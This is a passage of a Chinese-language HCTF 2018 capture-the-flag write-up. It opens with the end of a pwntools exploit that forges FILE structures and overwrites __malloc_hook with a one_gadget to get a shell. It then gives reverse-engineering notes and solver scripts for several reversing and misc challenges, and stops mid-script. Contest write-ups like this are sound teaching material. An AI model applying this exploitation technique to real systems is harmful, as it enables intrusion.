class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 7</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    malloc_hook_addr = libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 6</span><br><span class=\"line\">    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(p64(libc.address + 0x10a38c)) # one_gadget</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 7</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    sleep(0.5)</span><br><span class=\"line\">    p.sendline(&apos;%49$p&apos;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure></p>\n<p>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## re</span><br><span class=\"line\"></span><br><span class=\"line\">### LuckStar</span><br><span class=\"line\">这题有不少反调试.</span><br><span class=\"line\">首先在TlsCallback_0里获取了一堆反调试常用函数地址:</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ylwxkhkj31iw0abjru.jpg)</span><br><span class=\"line\">排查几款调试器，并解混淆的main函数</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ymtx7s7j315e0n4js0.jpg)</span><br><span class=\"line\">在之前获取的CheckRemoteDebuggerPresent函数下断点</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn2l65cj30nw06h3yw.jpg)</span><br><span class=\"line\">发现在调用main之前被调用，用于重设srand的种子,应为hctf。</span><br><span class=\"line\">接着进入main函数：</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn9qzczj30t10lp76f.jpg)</span><br><span class=\"line\">main函数里，my_base64函数被混淆，只用用seed=hctf才能正确还原。</span><br><span class=\"line\">my_base64如下：</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ynimy3ij30th0f9q3k.jpg)</span><br><span class=\"line\">在my_base64里面对输入的字符进行变异的base64处理，不过把大小写互换，然后把加密的结果做一段xor处理。return后与main函数里预存储的v17做比较，相同则得到flag。</span><br><span class=\"line\">由于仅作xor处理，这里我动调时把预存储的v17数据放在xor处理执行，得到base64(flag),</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypprkjaj30gr022t99.jpg)</span><br><span class=\"line\">做大小写转换后，解base64得flag:</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypyyscwj305x00xwec.jpg)</span><br><span class=\"line\"></span><br><span class=\"line\">### Seven</span><br><span class=\"line\"></span><br><span class=\"line\">驱动程序逆向，程序关键逻辑很少，需要我们走一个类似7字的迷宫，迷宫图直接就能看到，四个十六进制码0x11,0x1F,0x1E,0x20分别控制人物的上下左右移动，o代表当前位置，\\*代表不可行位置，.代表可行位置。整个程序找不到输入，但是能发现一个12字节的结构体，查阅资料发现是KEYBOARD_INPUT_DATA结构，第二个USHORT成员MAKECODE是键盘的扫描码，搜索扫描码，得到四个十六进制码分别对应wsad。</span><br><span class=\"line\">flag:```hctf&#123;ddddddddddddddssaasasasasasasasasas&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"PolishDuck\"><a href=\"#PolishDuck\" class=\"headerlink\" title=\"PolishDuck\"></a>PolishDuck</h3><p>Badusb的题目，同种类型的题目出现了很多次，印象里最先看到是在pwnhub-血月归来一题，后来是HITB-hex一题，到SUCTF2018的SecretGarden，XCTF2018Final，然后是HCTF2018的PolishDuck，做法和pwnhub上面的一模一样，都是打开notepad.exe，然后输入一串计算数字。我们只要整理出数字串，计算出结果，hex再hex解码即可得到flag。<br>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## misc</span><br><span class=\"line\"></span><br><span class=\"line\">### freq game</span><br><span class=\"line\">这个题题目大概就是把4个字符的ascii码作为参数进行正弦变换然后加起来的结果，看完代码发现最后乘的rge并没有卵用所以可以消掉，就变成了y/7 = sin() + sin() + sin() + sin()的样子，所以我找了y/7 &gt; 3的y作为约束条件，因为此时对应的四个sin()值必须都要大于y/7-3。本来是想把这个作为约束条件缩小范围再爆破的，结果用这个条件基本上就能把答案约束出来了，中间好像只有一组数是需要进一步爆破的，但剩的也不多所以很容易就获得了结果。代码如下：</span><br><span class=\"line\">```python</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">def show(mylist,testlist):</span><br><span class=\"line\">    for i in range(len(testlist)):</span><br><span class=\"line\">        if mylist[testlist[i][0]] &lt; testlist[i][1] - 3.0 :</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    return True</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(&apos;150.109.119.46&apos;,6775)</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">p.sendline(&apos;y&apos;)</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">p.sendline(&apos;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&apos;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;137 212 218 251&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;57 79 80 210&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;89 128 170 130&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;28 117 198 213&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;95 111 169 222&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;2 75 210 213&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;38 162 175 180&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">res = res[1:-1]</span><br><span class=\"line\"></span><br><span class=\"line\">numlist = []</span><br><span class=\"line\">ressplit = res.split(&apos;,&apos;)</span><br><span class=\"line\">testlist = []</span><br><span class=\"line\">for i in range(len(ressplit)):</span><br><span class=\"line\">    numlist.append(float(ressplit[i])/7.0)</span><br><span class=\"line\">    if float(ressplit[i])/7.0 &gt; 3.0:</span><br><span class=\"line\">        testlist.append((i,float(ressplit[i])/7.0))</span><br><span class=\"line\"></span><br><span class=\"line\">print testlist</span><br><span class=\"line\"></span><br><span class=\"line\">mylist = []</span><br><span class=\"line\">for i in range(256):</span><br><span class=\"line\">    temp = []</span><br><span class=\"line\">    x = np.linspace(0,1,1500)</span><br><span class=\"line\">    y = np.sin(2*np.pi*x*i)</span><br><span class=\"line\">    mylist.append(list(y))</span><br><span class=\"line\">    if show(list(y),testlist) :</span><br><span class=\"line\">        print i</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">temp = [88,89,128,129,130,169,170]</span><br><span class=\"line\">print testlist[2][1]</span><br><span class=\"line\">for a in temp:</span><br><span class=\"line\">    for b in temp:</span><br><span class=\"line\">        for c in temp:</span><br><span class=\"line\">            for d in temp:</span><br><span class=\"line\">                if mylist[a][testlist[2][0]] + mylist[b][testlist[2][0]] + mylist[c][testlist[2][0]] + mylist[d][testlist[2][0]] = testlist[2][1]:</span><br><span class=\"line\">                    print a,b,c,d</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>因为懒得把代码复制粘贴8遍，所以我是得到每轮结果以后把它保存下来，重开一个直接发过去的，所以最后脚本里只保留了最后一轮的过程，前面的都简化成了发结果。。。</p>\n<h3 id=\"Guess-My-Key\"><a href=\"#Guess-My-Key\" class=\"headerlink\" title=\"Guess My Key\"></a>Guess My Key</h3><p>这题听说是机器学习一开始没敢做，后来想想好像没那么难，题目思路是96bit的msg和96bit的key，可以任意提交msg和key来得到加密结果，或者提交msg获得用预设的key加密的结果，然后去猜题目预设的key。这个题我的思路是把raw_cipher当作一个空间向量，对每一bit的key去计算它是0和1时与key所获得的raw_cipher之间的距离来分析这1bit为0或1的概率，不断拟合使我计算所得的key与预设的key得到的空间向量不断接近，从而获得预设的key，代码如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">url = <span class=\"string\">'http://150.109.62.46:13577/enc?'</span></span><br><span class=\"line\"></span><br><span class=\"line\">orilist = []</span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00299699357119</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00170157012619</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00135932497845</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.000528410497059</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"string\">'1,'</span>*<span class=\"number\">95</span>+<span class=\"string\">'1'</span></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg)</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">oricipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">list2str</span><span class=\"params\">(mylist)</span>:</span></span><br><span class=\"line\">\tresult = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> mylist:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tresult += <span class=\"string\">'1,'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tresult += <span class=\"string\">'0,'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result[:<span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdst</span><span class=\"params\">(tempcipher,oricipher)</span>:</span></span><br><span class=\"line\">\tresult = <span class=\"number\">0.0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span 